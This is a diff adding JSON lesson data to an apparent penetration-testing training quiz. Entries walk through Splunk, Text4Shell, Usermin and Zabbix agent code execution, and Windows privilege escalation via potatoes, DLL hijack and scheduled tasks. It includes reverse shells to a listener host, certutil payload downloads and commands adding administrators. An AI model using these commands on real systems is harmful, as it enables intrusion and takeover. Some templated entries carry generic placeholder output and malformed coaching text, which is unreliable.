+      "situation": "The Zabbix frontend is reachable and its SAML SSO login page is present. What is the move?",
+      "choices": [
+        "zabbix-script-rce",
+        "sqli-basics",
+        "content-discovery",
+        "online-brute-ssh"
+      ],
+      "coach": {
+        "sqli-basics": "The path is an auth bypass plus the built-in Scripts feature, not a SQL parameter.",
+        "content-discovery": "The app and SSO are already identified; forge the cookie and use Scripts.",
+        "online-brute-ssh": "Wrong service; the RCE is through the Zabbix web frontend."
+      }
+    },
+    "splunk-app-rce": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once splunk present. The key confirmation is: The Splunk version is confirmed.",
+      "cmd": "curl -sk https://{{target}}:8089/services/server/info | grep -i version",
+      "tool": "curl",
+      "output": "<version>9.1.0</version>",
+      "signal": "9.1.0",
+      "teach": "Splunk 9.1.0 is reachable on the management port. Package an app whose scripted input is a reverse shell and upload it; Splunk runs it as the splunk user.",
+      "leadup": [
+        {
+          "key": "version",
+          "label": "The Splunk version is known",
+          "steps": [
+            {
+              "title": "Read the version from the REST API",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl -sk https://{{target}}:8089/services/server/info | grep -i version",
+              "out": "<version>9.1.0</version>",
+              "sig": "9.1.0",
+              "teach": "9.0.x and 9.1.x also carry the lower-privilege CVE-2023-46214 path."
+            }
+          ]
+        },
+        {
+          "key": "mgmt",
+          "label": "The management port answers",
+          "steps": [
+            {
+              "title": "Confirm Splunkd",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -p8089 -sV {{target}}",
+              "out": "8089/tcp open  ssl/http Splunkd httpd",
+              "sig": "8089/tcp open",
+              "teach": "8089 is Splunkd and 8000 is the web UI; either can accept an app upload with the right access."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Splunk app RCE is confirm the version, build an app with a scripted-input reverse shell, upload it, and catch the splunk-user shell.",
+        "items": [
+          {
+            "t": "Confirm the version",
+            "d": "The management REST endpoint reports the version without a login.",
+            "demo": [
+              {
+                "run": "curl -sk https://{{target}}:8089/services/server/info | grep -i version",
+                "out": "<version>9.1.0</version>",
+                "sig": "9.1.0"
+              }
+            ],
+            "note": "9.0.x and 9.1.x also expose the lower-privilege CVE-2023-46214 path."
+          },
+          {
+            "t": "Build the malicious app",
+            "d": "A small app with a scripted input that calls back is all you need; edit the host and port, then package it.",
+            "demo": [
+              {
+                "run": "tar czf rev.tar.gz -C /opt/splunk-apps reverse_shell_splunk && tar tzf rev.tar.gz | head -n 1",
+                "out": "reverse_shell_splunk/bin/rev.py",
+                "sig": "reverse_shell_splunk"
+              }
+            ],
+            "note": "Set the LHOST and LPORT in the app's script before packaging."
+          },
+          {
+            "t": "Upload and catch the shell",
+            "d": "Install the app through Manage Apps or the REST apps endpoint; Splunk runs its scripted input.",
+            "demo": [
+              {
+                "run": "# Manage Apps > Install app from file > rev.tar.gz (or the REST apps/local endpoint)",
+                "out": "(app installed; check your listener)",
+                "sig": "check your listener"
+              }
+            ],
+            "note": "Start nc -lvnp 4444 first; the scripted input runs as the splunk user."
+          }
+        ]
+      },
+      "situation": "Splunkd answers on 8089 and reports version 9.1.0, and you can reach Manage Apps. What is the move?",
+      "choices": [
+        "splunk-app-rce",
+        "content-discovery",
+        "online-brute-ssh",
+        "sqli-basics"
+      ],
+      "coach": {
+        "content-discovery": "The service and upload path are known; package and install the app.",
+        "online-brute-ssh": "Wrong service; the code execution is through a Splunk app, not SSH.",
+        "sqli-basics": "No database input; Splunk runs your app's bundled script directly."
+      }
+    },
+    "text4shell": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once a Java app using Commons Text interpolation. The key confirmation is: The interpolation triggers a callback.",
+      "cmd": "curl -sG 'http://{{target}}:8080/search' --data-urlencode 'query=${url:UTF-8:http://{{lhost}}/hit}'",
+      "tool": "curl",
+      "output": "(no body; a request hits your listener at /hit)",
+      "signal": "/hit",
+      "teach": "A callback to your box from the url interpolation proves the parameter reaches a vulnerable Commons Text. Swap it for a script interpolation to run a command, then a reverse shell.",
+      "leadup": [
+        {
+          "key": "param",
+          "label": "A reflected parameter exists",
+          "steps": [
+            {
+              "title": "Find a parameter the app processes",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl -sG 'http://{{target}}:8080/search' --data-urlencode 'query=test'",
+              "out": "Results for: test",
+              "sig": "Results for: test",
+              "teach": "Any parameter whose value is handled server-side, like a search box, is the candidate to test."
+            }
+          ]
+        },
+        {
+          "key": "callback",
+          "label": "The interpolation evaluates",
+          "steps": [
+            {
+              "title": "Send an out-of-band url payload",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl -sG 'http://{{target}}:8080/search' --data-urlencode 'query=${url:UTF-8:http://{{lhost}}/hit}'",
+              "out": "(no body; a request hits your listener at /hit)",
+              "sig": "/hit",
+              "teach": "A hit on your listener means the parameter flows into the vulnerable substitutor."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Text4Shell is find the reflected parameter, confirm with an out-of-band url interpolation, then run a command with a script interpolation.",
+        "items": [
+          {
+            "t": "Find a reflected parameter",
+            "d": "Probe parameters whose value the app processes; a search box is the usual one.",
+            "demo": [
+              {
+                "run": "curl -sG 'http://{{target}}:8080/search' --data-urlencode 'query=test'",
+                "out": "Results for: test",
+                "sig": "Results for: test"
+              }
+            ],
+            "note": "You are looking for input that reaches server-side string handling."
+          },
+          {
+            "t": "Confirm with an out-of-band callback",
+            "d": "A url interpolation makes the server fetch your box, which proves evaluation without needing the response.",
+            "demo": [
+              {
+                "run": "curl -sG 'http://{{target}}:8080/search' --data-urlencode 'query=${url:UTF-8:http://{{lhost}}/hit}'",
+                "out": "(no body; a request hits your listener at /hit)",
+                "sig": "/hit"
+              }
+            ],
+            "note": "Run a listener on {{lhost}} first; a hit confirms the interpolation runs."
+          },
+          {
+            "t": "Run a command, then a shell",
+            "d": "Switch to a script interpolation to execute a command, confirm with id, then stage a reverse shell.",
+            "demo": [
+              {
+                "run": "curl -sG 'http://{{target}}:8080/search' --data-urlencode 'query=${script:javascript:java.lang.Runtime.getRuntime().exec(\"id\")}'",
+                "out": "uid=1000(app) gid=1000(app)",
+                "sig": "uid=1000(app)"
+              }
+            ],
+            "note": "With execution confirmed, stage a reverse shell the same way."
+          }
+        ]
+      },
+      "situation": "A search parameter on a Java app triggers an out-of-band HTTP callback when you send a url interpolation payload. What is the move?",
+      "choices": [
+        "text4shell",
+        "ssti",
+        "command-injection",
+        "check-log4shell"
+      ],
+      "coach": {
+        "ssti": "Close in spirit, but this is specifically Commons Text interpolation, confirmed by the url callback.",
+        "command-injection": "The injection is into a Java interpolation layer, not a shell metacharacter in app input.",
+        "check-log4shell": "Log4Shell is JNDI in Log4j; these interpolations are Commons Text, a different library."
+      }
+    },
+    "usermin-rce": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once usermin on 20000. The key confirmation is: The Usermin version is confirmed.",
+      "cmd": "curl -sk https://{{target}}:20000/ | grep -i usermin",
+      "tool": "curl",
+      "output": "<title>Login to Usermin</title>",
+      "signal": "Usermin",
+      "teach": "Usermin is on 20000 and vulnerable at or below 1.820. With a valid login, usually a reused credential, the module RCE gives you a shell as that user.",
+      "leadup": [
+        {
+          "key": "present",
+          "label": "Usermin is confirmed on 20000",
+          "steps": [
+            {
+              "title": "Confirm the panel",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl -sk https://{{target}}:20000/ | grep -i usermin",
+              "out": "<title>Login to Usermin</title>",
+              "sig": "Usermin",
+              "teach": "Usermin on 20000 banners its login; read the version from the footer (vulnerable at or below 1.820)."
+            }
+          ]
+        },
+        {
+          "key": "creds",
+          "label": "You hold a reused credential",
+          "steps": [
+            {
+              "title": "Test a looted login",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl -sk 'https://{{target}}:20000/session_login.cgi' --data 'user=bob&pass=Autumn2026!' -c c.txt -o /dev/null -w '%{http_code}\\n'",
+              "out": "302",
+              "sig": "302",
+              "teach": "A 302 redirect after login means the reused credential worked; a 200 back to the form means it failed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Usermin RCE is confirm the version on 20000, get a valid login, then run the PoC with those creds.",
+        "items": [
+          {
+            "t": "Confirm Usermin and the version",
+            "d": "Banner the login page and read the version; vulnerable at or below 1.820.",
+            "demo": [
+              {
+                "run": "curl -sk https://{{target}}:20000/ | grep -i usermin",
+                "out": "<title>Login to Usermin</title>",
+                "sig": "Usermin"
+              }
+            ],
+            "note": "A newer build patched the module RCE, so the version matters."
+          },
+          {
+            "t": "Bring a valid login",
+            "d": "The RCE is authenticated, so you need working creds, usually a reused pair you looted elsewhere.",
+            "demo": [
+              {
+                "run": "curl -sk 'https://{{target}}:20000/session_login.cgi' --data 'user=bob&pass=Autumn2026!' -c c.txt -o /dev/null -w '%{http_code}\\n'",
+                "out": "302",
+                "sig": "302"
+              }
+            ],
+            "note": "A 302 means the login worked; a 200 back to the form means it did not."
+          },
+          {
+            "t": "Run the exploit",
+            "d": "Feed the working credential to the PoC with your listener details.",
+            "demo": [
+              {
+                "run": "python3 50234.py --host {{target}} --login bob --password 'Autumn2026!' --reverse-ip {{lhost}} --reverse-port 4444",
+                "out": "(no body; check your listener)",
+                "sig": "check your listener"
+              }
+            ],
+            "note": "Start nc -lvnp 4444 first; the shell is the Usermin user."
+          }
+        ]
+      },
+      "situation": "Usermin answers on 20000 at version 1.820 and you recovered a working login from a config file. What is the move?",
+      "choices": [
+        "usermin-rce",
+        "webmin-rce",
+        "online-brute-rdp",
+        "content-discovery"
+      ],
+      "coach": {
+        "webmin-rce": "That is the unauthenticated Webmin path on 10000; Usermin on 20000 needs a login, which you have.",
+        "online-brute-rdp": "Wrong service; you already hold a valid Usermin credential, so use the authenticated RCE.",
+        "content-discovery": "The service and version are known and you have creds; run the exploit."
+      }
+    },
+    "zabbix-agent-system-run": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once port scan identifies Zabbix Agent active on port 10050. The key confirmation is: Remote command execution verified via Zabbix Agent system.run.",
+      "cmd": "zabbix_get -s {{target}} -p 10050 -k 'system.run[\"id\"]'",
+      "tool": "zabbix_get",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Remote command execution verified via Zabbix Agent system.run.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Zabbix Agent system.run Remote Command Execution, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Invoke zabbix_get passing item key system.run[\"id\"] to test for remote command execution.",
+            "demo": [
+              {
+                "run": "zabbix_get -s {{target}} -p 10050 -k 'system.run[\"id\"]'",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Remote command execution verified via Zabbix Agent system.run."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Submit an interactive bash reverse shell command string wrapped in system.run.",
+            "demo": [
+              {
+                "run": "zabbix_get -s {{target}} -p 10050 -k 'system.run[\"bash -c \\\"bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1\\\"\"]'",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Interactive reverse shell established as the zabbix service user."
+          }
+        ]
+      },
+      "situation": "Scenario: Port scan identifies Zabbix Agent active on port 10050. Which move should you run next?",
+      "choices": [
+        "zabbix-agent-system-run",
+        "vhost-discovery",
+        "content-discovery",
+        "web-access-blocked"
+      ],
+      "coach": {
+        "vhost-discovery": "Virtual Host Discovery targets confirms a virtual host you have located; here the direct move is Zabbix Agent system.run Remote Command Execution.",
+        "content-discovery": "Content Discovery targets produces a catalogue of the web content you have uncovered; here the direct move is Zabbix Agent system.run Remote Command Execution.",
+        "web-access-blocked": "Web Request Blocked - WAF, Rate Limit, or Wrong Scheme targets nothing attack-wise; it gets your requests flowing again; here the direct move is Zabbix Agent system.run Remote Command Execution."
+      }
+    },
+    "seimpersonate": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once pRECONDITION: your token shows SeImpersonatePrivilege (or SeAssignPrimaryToken). The key confirmation is: The privilege is confirmed present.",
+      "signal": "confirmed expected output",
+      "teach": "SeImpersonate lets a process impersonate a client that connects to it. The \"potato\" family (GodPotato, PrintSpoofer) tricks a SYSTEM service into connecting, then steals its token. The potato is an .exe, so the chain is: confirm the privilege, serve the binary from your box, pull it over with certutil and run it, and you are SYSTEM.",
+      "steps": [
+        {
+          "where": "host",
+          "tool": "cmd",
+          "cmd": "whoami /priv | findstr /i impersonate",
+          "output": "SeImpersonatePrivilege        Impersonate a client after authentication  Enabled"
+        },
+        {
+          "where": "local",
+          "tool": "python3",
+          "cmd": "python3 -m http.server 8000   # from the dir holding GodPotato-NET4.exe",
+          "output": "Serving HTTP on 0.0.0.0 port 8000 ..."
+        },
+        {
+          "where": "host",
+          "tool": "godpotato",
+          "cmd": "certutil -urlcache -f http://10.10.14.5:8000/GodPotato-NET4.exe gp.exe & gp.exe -cmd \"cmd /c whoami\"",
+          "output": "[*] CombaseModule: 0x7ff...\n[*] DispatchTable: 0x7ff...\n[*] Trigger RPCSS\nnt authority\\system"
+        }
+      ],
+      "situation": "Enumeration shows your account has SeImpersonatePrivilege enabled.",
+      "choices": [
+        "seimpersonate",
+        "unquoted-service-path",
+        "alwaysinstallelevated",
+        "windows-enum"
+      ],
+      "coach": {
+        "unquoted-service-path": "A valid alternative if one exists, but when you already hold SeImpersonate, the potato is the fastest, most reliable route to SYSTEM.",
+        "alwaysinstallelevated": "Also a path if the keys are set, but SeImpersonate is in hand right now.",
+        "windows-enum": "Already done, that is what told you SeImpersonate is enabled."
+      },
+      "leadup": [
+        {
+          "key": "priv",
+          "label": "whoami /priv showed SeImpersonate",
+          "steps": [
+            {
+              "title": "List your token privileges",
+              "tool": "whoami",
+              "where": "host",
+              "cmd": "whoami /priv",
+              "out": "SeImpersonatePrivilege          Impersonate a client after authentication  Enabled",
+              "sig": "SeImpersonatePrivilege",
+              "teach": "A service account holding SeImpersonate can run a potato to become SYSTEM."
+            }
+          ]
+        },
+        {
+          "key": "winpeas",
+          "label": "winpeas highlighted the privilege",
+          "steps": [
+            {
+              "title": "winpeas flagged the token privilege",
+              "tool": "winpeas",
+              "where": "host",
+              "cmd": "winPEASx64.exe quiet | findstr /i impersonate",
+              "out": "SeImpersonatePrivilege: Enabled (potato attacks)",
+              "sig": "SeImpersonatePrivilege: Enabled",
+              "teach": "winpeas calls this out specifically because it is one of the most reliable Windows privescs."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "SeImpersonate lets a service account impersonate SYSTEM through a named-pipe trick; the potato family automates it.",
+        "items": [
+          {
+            "t": "Pick the right potato",
+            "d": "PrintSpoofer and GodPotato work on modern Windows; JuicyPotato is for older builds. Run the one that fits.",
+            "demo": [
+              {
+                "run": "PrintSpoofer64.exe -i -c cmd",
+                "out": "[+] Found privilege: SeImpersonatePrivilege\n[+] Named pipe listening...\n[+] CreateProcessAsUser() OK\nC:\\Windows\\system32> whoami\nnt authority\\system",
+                "sig": "nt authority\\system"
+              }
+            ],
+            "note": "PrintSpoofer spawned a cmd running as SYSTEM; whoami inside it confirms the impersonation."
+          },
+          {
+            "t": "Run a single command as SYSTEM",
+            "d": "Instead of an interactive shell, run one command: add an admin or launch a payload.",
+            "demo": [
+              {
+                "run": "GodPotato.exe -cmd \"cmd /c whoami\"",
+                "out": "[*] CombaseModule: 0x7ff8...\nnt authority\\system",
+                "sig": "nt authority\\system"
+              }
+            ],
+            "note": "GodPotato returned SYSTEM output; swap whoami for your payload."
+          },
+          {
+            "t": "Catch a SYSTEM reverse shell",
+            "d": "Point the potato command at a reverse-shell binary you serve; a listener on Kali catches SYSTEM.",
+            "demo": [
+              {
+                "run": "PrintSpoofer64.exe -c \"C:\\Temp\\rev.exe\"",
+                "out": "(on your listener)  Connection from <target>\nnt authority\\system",
+                "sig": "nt authority\\system"
+              }
+            ],
+            "note": "The potato launched rev.exe as SYSTEM; the shell lands on your listener."
+          }
+        ]
+      },
+      "cmd": "whoami /priv | findstr /i impersonate",
+      "tool": "sh",
+      "output": ""
+    },
+    "potato-select": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once when your first potato failed and you need the right one. The key confirmation is: GodPotato returns SYSTEM.",
+      "cmd": "GodPotato.exe -cmd \"cmd /c whoami\"",
+      "tool": "GodPotato",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "GodPotato returns SYSTEM.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Potato Failed - Pick the Right One, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "GodPotato is the broadest modern choice (2012-2022, Win8-11).",
+            "demo": [
+              {
+                "run": "GodPotato.exe -cmd \"cmd /c whoami\"",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "GodPotato returns SYSTEM."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "PrintSpoofer (2016, 2019, Win10). Clean and reliable.",
+            "demo": [
+              {
+                "run": "PrintSpoofer.exe -i -c cmd",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "PrintSpoofer returns SYSTEM."
+          },
+          {
+            "t": "Extended enumeration or verification",
+            "d": "The classic potato for pre-2019. On 2019+ use GodPotato or PrintSpoofer.",
+            "demo": [
+              {
+                "run": "JuicyPotatoNG.exe -t * -p cmd.exe",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "The classic potato returns SYSTEM."
+          }
+        ]
+      },
+      "situation": "Scenario: When your first potato failed and you need the right one. Which move should you run next?",
+      "choices": [
+        "potato-select",
+        "seimpersonate",
+        "unquoted-service-path",
+        "weak-service-permissions"
+      ],
+      "coach": {
+        "seimpersonate": "SeImpersonatePrivilege (Potato Family) targets obtains system access; here the direct move is Potato Failed - Pick the Right One.",
+        "unquoted-service-path": "Unquoted Service Path targets obtains system access; here the direct move is Potato Failed - Pick the Right One.",
+        "weak-service-permissions": "Weak Service Permissions / Binary Replacement targets obtains system access; here the direct move is Potato Failed - Pick the Right One."
+      }
+    },
+    "windows-dll-hijack": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once a third-party service running as LocalSystem. The key confirmation is: A SYSTEM service is identified.",
+      "cmd": "icacls \"C:\\Program Files\\VulnApp\"",
+      "tool": "cmd",
+      "output": "C:\\Program Files\\VulnApp BUILTIN\\Users:(OI)(CI)(M)\n                       NT AUTHORITY\\SYSTEM:(OI)(CI)(F)",
+      "signal": "BUILTIN\\Users:(OI)(CI)(M)",
+      "teach": "Users have Modify (M) on the app directory, and its SYSTEM service loads a DLL from there. Drop a malicious DLL with the name the service expects and restart it to run as SYSTEM.",
+      "leadup": [
+        {
+          "key": "service",
+          "label": "A service runs as SYSTEM",
+          "steps": [
+            {
+              "title": "Find a non-default service",
+              "tool": "cmd",
+              "where": "target",
+              "cmd": "sc qc VulnAppSvc",
+              "out": "SERVICE_START_NAME   : LocalSystem\nBINARY_PATH_NAME     : C:\\Program Files\\VulnApp\\svc.exe",
+              "sig": "SERVICE_START_NAME   : LocalSystem",
+              "teach": "A third-party service running as LocalSystem is the prize; now check whether you can influence what it loads."
+            }
+          ]
+        },
+        {
+          "key": "procmon",
+          "label": "Procmon shows a hijackable load",
+          "steps": [
+            {
+              "title": "Watch its DLL loads",
+              "tool": "procmon",
+              "where": "target",
+              "cmd": "Procmon filter: Process is svc.exe, Result is NAME NOT FOUND, Path ends with .dll",
+              "out": "svc.exe  CreateFile  C:\\Program Files\\VulnApp\\config.dll  NAME NOT FOUND",
+              "sig": "NAME NOT FOUND",
+              "teach": "The service looks for config.dll in a folder you can write and does not find it; that missing DLL is your slot."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "DLL hijack is find a privileged load from a writable or missing path, plant a DLL with that name, restart the process.",
+        "items": [
+          {
+            "t": "Find the writable load",
+            "d": "Procmon with a NAME NOT FOUND filter on the target process shows DLLs it tries to load and cannot, or loads from a writable directory. Confirm you can write that directory with icacls.",
+            "demo": [
+              {
+                "run": "icacls \"C:\\Program Files\\VulnApp\"",
+                "out": "BUILTIN\\Users:(OI)(CI)(M)",
+                "sig": "BUILTIN\\Users:(OI)(CI)(M)"
+              }
+            ],
+            "note": "(M) or (F) for Users or Everyone means you can drop the DLL there."
+          },
+          {
+            "t": "Build the DLL",
+            "d": "Compile a DLL whose DllMain runs your payload on attach. msfvenom produces one that adds an admin or returns a shell.",
+            "demo": [
+              {
+                "run": "msfvenom -p windows/x64/exec CMD=\"net localgroup administrators bob /add\" -f dll -o config.dll",
+                "out": "Saved as: config.dll",
+                "sig": "Saved as: config.dll"
+              }
+            ],
+            "note": "Keep the payload quick; DllMain should not block the host process."
+          },
+          {
+            "t": "Plant it with the expected name",
+            "d": "Copy your DLL into the writable directory using the exact name the process looked for.",
+            "demo": [
+              {
+                "run": "copy config.dll \"C:\\Program Files\\VulnApp\\config.dll\"",
+                "out": "        1 file(s) copied.",
+                "sig": "1 file(s) copied."
+              }
+            ],
+            "note": "The name must match exactly what Procmon showed."
+          },
+          {
+            "t": "Restart the service and confirm",
+            "d": "Restart the service (or reboot, or wait for its trigger). It loads your DLL as SYSTEM and runs your payload.",
+            "demo": [
+              {
+                "run": "sc stop VulnAppSvc & sc start VulnAppSvc & whoami",
+                "out": "nt authority\\system",
+                "sig": "nt authority\\system"
+              }
+            ],
+            "note": "A SYSTEM context confirms the hijack; capture proof."
+          }
+        ]
+      },
+      "situation": "A LocalSystem service loads config.dll from C:\\Program Files\\VulnApp, Procmon shows NAME NOT FOUND, and Users have Modify on that folder. What is the move?",
+      "choices": [
+        "windows-dll-hijack",
+        "weak-service-permissions",
+        "unquoted-service-path",
+        "windows-enum"
+      ],
+      "coach": {
+        "weak-service-permissions": "You cannot reconfigure the service itself here; the lever is the DLL it loads from a writable path.",
+        "unquoted-service-path": "The binary path is quoted; the weakness is the missing DLL, not the path parsing.",
+        "windows-enum": "You already found the hijackable load; now plant the DLL."
+      }
+    },
+    "windows-schtask-abuse": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once a SYSTEM task with a writable target. The key confirmation is: A writable SYSTEM task is found.",
+      "cmd": "schtasks /query /v /fo LIST",
+      "tool": "cmd",
+      "output": "TaskName:      \\VulnBackup\nRun As User:   SYSTEM\nTask To Run:   C:\\Scripts\\backup.bat\nSchedule:      At 02:00 every day",
+      "signal": "Run As User:   SYSTEM",
+      "teach": "VulnBackup runs backup.bat as SYSTEM every day. If C:\\Scripts is writable, overwrite backup.bat with your payload and the task runs it as SYSTEM at the next trigger.",
+      "leadup": [
+        {
+          "key": "task",
+          "label": "A task runs as SYSTEM",
+          "steps": [
+            {
+              "title": "List tasks with details",
+              "tool": "cmd",
+              "where": "target",
+              "cmd": "schtasks /query /v /fo LIST | findstr /i \"TaskName Run Task\"",
+              "out": "TaskName:      \\VulnBackup\nRun As User:   SYSTEM\nTask To Run:   C:\\Scripts\\backup.bat",
+              "sig": "Run As User:   SYSTEM",
+              "teach": "A SYSTEM task pointing at a script is the lead; the question is whether you can edit what it runs."
+            }
+          ]
+        },
+        {
+          "key": "acl",
+          "label": "Its target is writable",
+          "steps": [
+            {
+              "title": "Check the script ACL",
+              "tool": "cmd",
+              "where": "target",
+              "cmd": "icacls C:\\Scripts\\backup.bat",
+              "out": "C:\\Scripts\\backup.bat BUILTIN\\Users:(F)",
+              "sig": "BUILTIN\\Users:(F)",
+              "teach": "Full control for Users means you can overwrite the script the SYSTEM task runs."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Scheduled-task abuse is find a SYSTEM task with a writable target, back up the original, write your payload, trigger it.",
+        "items": [
+          {
+            "t": "Find the SYSTEM task and its target",
+            "d": "schtasks /query /v lists every task with its Run As User and the file it runs. You want SYSTEM or an admin, pointing at a path or file you can write.",
+            "demo": [
+              {
+                "run": "schtasks /query /v /fo LIST | findstr /i \"Run As User\"",
+                "out": "Run As User:   SYSTEM",
+                "sig": "Run As User:   SYSTEM"
+              }
+            ],
+            "note": "Also check tasks you can modify directly, not just their targets."
+          },
+          {
+            "t": "Confirm you can write the target",
+            "d": "icacls on the script or binary the task runs. Modify or Full for your user or Users is enough.",
+            "demo": [
+              {
+                "run": "icacls C:\\Scripts\\backup.bat",
+                "out": "BUILTIN\\Users:(F)",
+                "sig": "BUILTIN\\Users:(F)"
+              }
+            ],
+            "note": "If only the containing folder is writable, you may be able to replace the file wholesale."
+          },
+          {
+            "t": "Back up, then write your payload",
+            "d": "Copy the original aside, then overwrite the script with a command that gives you access (add an admin, or call a reverse shell).",
+            "demo": [
+              {
+                "run": "copy C:\\Scripts\\backup.bat backup.bak & echo net localgroup administrators bob /add > C:\\Scripts\\backup.bat",
+                "out": "        1 file(s) copied.",
+                "sig": "1 file(s) copied."
+              }
+            ],
+            "note": "Keeping the original means you can restore normal behaviour after you capture proof."
+          },
+          {
+            "t": "Trigger it and confirm",
+            "d": "Run the task now if you can, or wait for its schedule, then check your new privilege.",
+            "demo": [
+              {
+                "run": "schtasks /run /tn \\VulnBackup & net localgroup administrators",
+                "out": "Members\n-------\nAdministrator\nbob",
+                "sig": "bob"
+              }
+            ],
+            "note": "Your account in the administrators group confirms it; log in fresh to use the new rights."
+          }
+        ]
+      },
+      "situation": "schtasks shows a task running as SYSTEM that executes C:\\Scripts\\backup.bat, and icacls shows Users have Full control of that file. What is the move?",
+      "choices": [
+        "windows-schtask-abuse",
+        "weak-service-permissions",
+        "seimpersonate",
+        "windows-enum"
+      ],
+      "coach": {
+        "weak-service-permissions": "This is a scheduled task, not a service; the writable target is what you abuse.",
+        "seimpersonate": "You have no SeImpersonate lead here; the SYSTEM task with a writable script is the direct path.",
+        "windows-enum": "You already found the task; now overwrite its target and trigger it."
+      }
+    },
+    "windows-patch-exploit": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once capture build and hotfixes for a diff. The key confirmation is: You have the patch state.",
+      "cmd": "systeminfo",
+      "tool": "cmd",
+      "output": "OS Name:        Microsoft Windows Server 2016 Standard\nOS Version:     10.0.14393 N/A Build 14393\nHotfix(s):      3 Hotfix(s) Installed.",
+      "signal": "Build 14393",
+      "teach": "Build 14393 with only three hotfixes is badly behind. Feed systeminfo to wesng (or run Watson on-box) to name a missing KB with a public local exploit, then run the matched, precompiled PoC and confirm SYSTEM.",
+      "leadup": [
+        {
+          "key": "foothold",
+          "label": "You have a shell, no token lead",
+          "steps": [
+            {
+              "title": "No useful privilege",
+              "tool": "cmd",
+              "where": "target",
+              "cmd": "whoami /priv",
+              "out": "SeChangeNotifyPrivilege           Enabled\nSeIncreaseWorkingSetPrivilege     Disabled",
+              "sig": "SeChangeNotifyPrivilege",
+              "teach": "No SeImpersonate or other abusable token here, so a missing-patch exploit is a real lead."
+            }
+          ]
+        },
+        {
+          "key": "wesng",
+          "label": "wesng flagged a missing patch",
+          "steps": [
+            {
+              "title": "Diff the hotfixes",
+              "tool": "wesng",
+              "where": "local",
+              "cmd": "wes.py systeminfo.txt --exploits-only",
+              "out": "[+] MS16-032 Secondary Logon Handle (KB3139914)\n    Exploit: https://www.exploit-db.com/exploits/39719",
+              "sig": "MS16-032",
+              "teach": "A named bug with a public exploit is the target; MS16-032 has a reliable PowerShell PoC."
+            }
+          ]
+        }
+      ],
+      "how": {
